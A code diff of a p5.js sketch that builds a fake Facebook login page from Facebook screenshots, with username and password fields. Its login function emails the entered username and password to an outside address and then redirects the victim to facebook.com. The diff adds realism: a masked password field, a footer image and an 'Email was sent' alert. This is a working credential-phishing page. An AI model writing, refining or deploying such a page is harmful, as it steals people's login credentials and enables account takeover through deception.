@@ -1,9 +1,12 @@
-let wdth, hght, input, bckgrnd, banner, email;
+let wdth, hght, input, bckgrnd, banner, email, bottom, shouldResize;
 
 function setup() {
   createCanvas(windowWidth, 840);
+  shouldResize = true;
   bckgrnd = loadImage('facebook.PNG');
   banner = loadImage('facebookbanner.PNG');
+  bottom = loadImage('bottom.PNG');
+  // console.log(banner.width);
   //   wdth = width/10;
   //   hght = height/10;
   username = createInput();
@@ -18,7 +21,7 @@ function setup() {
   username.elt.style.outline = 'none'
 
 
-  password = createInput();
+  password = createInput('', 'password');
   password.size(300, 30);
   password.position(610, 300);
   password.style('border', '1px solid black');
@@ -46,6 +49,8 @@ function setup() {
   newAccount.style('display', 'inline-block');
   newAccount.style('font-size', '15px');
   newAccount.mousePressed(newacc);
+
+  // canvas.resize(banne);
 }
 
 
@@ -59,7 +64,7 @@ function login() {
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br><br>Password " + password.value()
   }).then(
-//     alert('Email was sent')
+    alert('Email was sent')
   );
   window.location.replace("http://facebook.com");
 }
@@ -69,7 +74,14 @@ function newacc() {
 }
 
 function draw() {
+  // resizeCanvas(banner.width, 840);
+  // if(shouldResize && banner.width>100){
+  // // banner.width-=00;
+  // shouldResize = false;
+  //    }
+  
   background(236, 236, 236);
+  
   push();
   fill(255);
   noStroke();
@@ -81,6 +93,11 @@ function draw() {
   stroke(220);
   strokeWeight(0.1);
   rect(455, 165, 610, 375);
+  
+  push();
+  // scale(5, 0, 0);
+  image(bottom, 0, 620, width, bottom.height/1.3);
+  pop();
   pop();
   push();
   textSize(19);
@@ -101,9 +118,6 @@ function draw() {
   textSize(11);
   text('or', 755, 445);
   pop();
-
-
-
 
 
 
